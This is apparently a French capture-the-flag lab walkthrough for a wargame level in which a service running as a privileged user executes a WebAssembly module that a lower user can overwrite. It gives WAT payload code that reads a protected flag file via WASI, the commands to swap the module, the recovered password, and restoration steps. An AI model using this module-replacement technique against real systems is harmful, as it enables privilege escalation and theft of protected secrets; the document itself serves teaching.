# Level05 — WebAssembly et WASI

## Objectif

Comprendre comment un service peut exécuter avec des privilèges élevés un module WebAssembly contrôlé par un autre utilisateur. Ce niveau reprend la frontière de confiance des niveaux précédents, mais le payload manipule explicitement la mémoire et les fonctions de fichiers fournies par WASI.

## 1. Lire l’indice

```bash
cat README
```

Résultat :

```text
The Metaverse runs on code. Code can be rewritten.
```

L’indice suggère qu’un programme utilisé par le niveau peut être modifié.

## 2. Identifier le module et le service

```bash
id
ls -la /opt/snowcrash/level05
systemctl cat metaverse.service
```

Les observations conservées indiquent que :

- `level05` appartient au groupe `metaverse` ;
- ce groupe peut modifier `/opt/snowcrash/level05/metaverse.wasm` ;
- `metaverse.service` exécute ce module sous l’identité `flag05` ;
- le service rend la racine `/` accessible au module par l’intermédiaire de WASI.

Le principe général est donc :

```text
level05 modifie metaverse.wasm
                │
                ▼
 metaverse.service exécute le module
                │
                ▼
    WASI accède aux fichiers autorisés
      avec les droits de flag05
```

## 3. Comprendre les technologies utilisées

| Terme | Signification |
| --- | --- |
| WASM | Format binaire WebAssembly exécuté par le service. |
| WAT | Représentation textuelle et lisible d’un module WebAssembly. |
| WASI | Interface qui fournit au module des fonctions système contrôlées, notamment pour les fichiers. |
| Wasmtime | Environnement capable d’exécuter un module WebAssembly avec WASI. |
| `wat2wasm` | Outil qui convertit un fichier WAT en module WASM. |

L’environnement d’exécution définit les répertoires et les fonctions système accessibles au module WebAssembly. Dans ce niveau, la configuration rapportée préouvre `/`, ce qui rend le fichier du flag accessible au service.

## 4. Résumer l’algorithme

Avant de lire le WAT, le comportement du [payload.wat](payload.wat) peut être résumé en quatre opérations :

```text
ouvrir /home/flag05/.flag
lire son contenu dans la mémoire du module
ouvrir /opt/snowcrash/level05/x
écrire dans x le nombre exact d’octets lus
```

La longueur du code vient surtout du fait que WebAssembly manipule explicitement les adresses, les structures en mémoire et les arguments de chaque fonction.

## 5. Comprendre les imports WASI

Le module importe trois fonctions fournies par l’environnement WASI :

```wat
(import "wasi_snapshot_preview1" "path_open"
  (func $path_open
    (param i32 i32 i32 i32 i32 i64 i64 i32 i32)
    (result i32)))

(import "wasi_snapshot_preview1" "fd_read"
  (func $fd_read
    (param i32 i32 i32 i32)
    (result i32)))

(import "wasi_snapshot_preview1" "fd_write"
  (func $fd_write
    (param i32 i32 i32 i32)
    (result i32)))
```

| Fonction | Rôle |
| --- | --- |
| `path_open` | Ouvrir un chemin et produire un descripteur de fichier. |
| `fd_read` | Lire depuis un descripteur vers la mémoire. |
| `fd_write` | Écrire depuis la mémoire vers un descripteur. |

`i32` et `i64` désignent respectivement des entiers de 32 et 64 bits. Les déclarations `param` décrivent les arguments attendus. Le `result i32` est un code d’erreur WASI ; le payload le supprime avec `drop` au lieu de le vérifier.

## 6. Comprendre l’organisation de la mémoire

Le module réserve une page mémoire WebAssembly, soit 65 536 octets, et y place deux chemins :

```wat
(memory (export "memory") 1)
(data (i32.const 0) "home/flag05/.flag")
(data (i32.const 32) "opt/snowcrash/level05/x")
```

Les chemins ne commencent pas par `/` parce qu’ils sont résolus relativement au répertoire préouvert par WASI, qui correspond ici à la racine.

| Adresse | Contenu ou rôle |
| ---: | --- |
| `0` | Chemin source de 17 octets : `home/flag05/.flag`. |
| `32` | Chemin de destination de 23 octets : `opt/snowcrash/level05/x`. |
| `64` | Début de la structure `iovec` : adresse du tampon. |
| `68` | Taille du tampon, ensuite remplacée par le nombre d’octets réellement lus. |
| `72` | Nombre d’octets lus par `fd_read`. |
| `76` | Nombre d’octets écrits par `fd_write`. |
| `80` | Descripteur du fichier source. |
| `84` | Descripteur du fichier de destination. |
| `128` | Début du tampon qui reçoit le flag. |

L’auteur du module a choisi ces adresses pour organiser la mémoire sans chevauchement entre les zones.

## 7. Ouvrir le fichier source

Le payload empile les arguments de `path_open`, puis appelle la fonction :

```wat
i32.const 3
i32.const 0
i32.const 0
i32.const 17
i32.const 0
i64.const 2
i64.const 0
i32.const 0
i32.const 80
call $path_open
drop
```

| Valeur | Paramètre représenté |
| ---: | --- |
| `3` | Descripteur du répertoire préouvert. |
| `0` | Aucune option particulière de résolution du chemin. |
| `0` | Adresse du chemin source en mémoire. |
| `17` | Longueur du chemin `home/flag05/.flag`. |
| `0` | Aucune option de création pour le fichier source. |
| `2` | Droit WASI de lecture demandé. |
| `0` | Aucun droit héritable supplémentaire. |
| `0` | Aucune option particulière sur le descripteur. |
| `80` | Adresse où WASI écrit le descripteur obtenu. |

Le descripteur `3` dépend de la configuration du runtime. Il correspond ici au premier répertoire préouvert d’après le fonctionnement rapporté sur la VM ; cette hypothèse doit être reliée à la ligne de lancement exacte du service.

## 8. Lire le contenu avec `fd_read`

WASI utilise une structure appelée `iovec` pour décrire le tampon de lecture :

```wat
i32.const 64
i32.const 128
i32.store

i32.const 68
i32.const 64
i32.store
```

La première partie place à l’adresse `64` un pointeur vers le tampon situé à l’adresse `128`. La seconde fixe à `64` octets la taille maximale de lecture.

Le module charge ensuite le descripteur stocké à l’adresse `80`, appelle `fd_read` avec cette `iovec`, puis demande à WASI d’écrire à l’adresse `72` le nombre d’octets réellement lus.

## 9. Ouvrir la destination et écrire le résultat

La seconde utilisation de `path_open` ouvre `opt/snowcrash/level05/x` :

- l’adresse du chemin est `32` et sa longueur est `23` ;
- la valeur `9` combine les options WASI de création et de troncature ;
- la valeur `64` demande le droit WASI d’écriture ;
- le descripteur obtenu est stocké à l’adresse `84`.

Avant d’appeler `fd_write`, le payload ajuste la taille de l’`iovec` :

```wat
i32.const 68
i32.const 72
i32.load
i32.store
```

Cette séquence copie à l’adresse `68` le nombre d’octets réellement lus, enregistré à l’adresse `72`. Sans cet ajustement, le programme écrirait systématiquement 64 octets, y compris la partie inutilisée du tampon.

`fd_write` écrit enfin les données du tampon vers le descripteur stocké à l’adresse `84` et place le nombre d’octets écrits à l’adresse `76`.

## 10. Compiler et installer le payload

Depuis le terminal hôte, à la racine du dépôt, copier le WAT vers la VM :

```bash
scp -P 4242 level05/resources/payload.wat level05@localhost:/tmp/payload.wat
```

Dans la VM, vérifier d’abord l’état du fichier de sortie, puis le créer et préparer le module :

```bash
ls -l /opt/snowcrash/level05/x
touch /opt/snowcrash/level05/x
chmod 666 /opt/snowcrash/level05/x
wat2wasm /tmp/payload.wat -o /tmp/payload.wasm
```

Le mode `666` autorise ici la lecture et l’écriture pour tous les utilisateurs afin que `level05` et le service puissent utiliser le même fichier. Cette permission volontairement large sert uniquement au test pédagogique et ne doit pas être conservée.

Sauvegarder le module original et son empreinte, puis remplacer son contenu :

```bash
cp /opt/snowcrash/level05/metaverse.wasm /tmp/metaverse.bak
sha256sum /tmp/metaverse.bak
cat /tmp/payload.wasm > /opt/snowcrash/level05/metaverse.wasm
```

Après le passage du timer, lire la destination :

```bash
cat /opt/snowcrash/level05/x
```

Le secret récupéré est :

```text
viuaaale9huek52boumoomioc
```

## 11. Restaurer l’état initial

Restaurer le module original et vérifier les empreintes avant de supprimer la sauvegarde :

```bash
cat /tmp/metaverse.bak > /opt/snowcrash/level05/metaverse.wasm
sha256sum /tmp/metaverse.bak /opt/snowcrash/level05/metaverse.wasm
```

Les notes confirment que les deux empreintes étaient identiques après restauration. Les fichiers créés pour le test peuvent alors être retirés :

```bash
rm -f /tmp/metaverse.bak /tmp/payload.wat /tmp/payload.wasm
rm -f /opt/snowcrash/level05/x
```

Si `x` existait avant le test, il faut le restaurer plutôt que le supprimer.

## 12. Passer à `level06`

```bash
su - level06
```

Saisir le secret comme mot de passe, puis vérifier l’identité obtenue :

```bash
id -un
```

Résultat attendu : `level06`. Le passage au compte suivant a réussi avec la valeur récupérée, également conservée dans `level05/flag`.

## Pourquoi cette méthode fonctionne

Le timer lance avec les droits de `flag05` un module WASM modifiable par `level05`. Le service lui accorde en plus un accès WASI à la racine. Le payload peut donc demander au runtime d’ouvrir le flag, de le lire en mémoire et de l’écrire dans un fichier accessible.

La faille résulte de la combinaison d’un module modifiable, d’une identité privilégiée et de ressources WASI trop largement exposées.

## Limites du payload

- Les codes d’erreur de `path_open`, `fd_read` et `fd_write` sont ignorés avec `drop`.
- Le tampon limite la lecture à 64 octets.
- Le descripteur `3` suppose l’ordre de préouverture observé dans cette configuration WASI.
- Les chemins et les longueurs sont codés en dur.

Ce module volontairement minimal est adapté au puzzle. Son fonctionnement et le passage à `level06` sont rapportés comme confirmés sur la VM ; le dépôt conserve le résultat, tandis que les sorties originales de compilation et d’exécution restent à ajouter.

## À expliquer à l’évaluation

> Le service exécute sous `flag05` un module WASM modifiable par `level05` et lui préouvre la racine via WASI. Mon module ouvre le flag, le lit dans un tampon, ouvre un fichier de sortie puis y écrit exactement le nombre d’octets lus. Après récupération du secret, j’ai restauré le module original et vérifié son empreinte.

## Traçabilité à conserver

Conserver la sortie de `systemctl cat`, les permissions de `metaverse.wasm`, la configuration des répertoires WASI préouverts, la sortie de `wat2wasm`, les passages du timer, les empreintes avant et après restauration, ainsi que le résultat de `id -un` après validation.
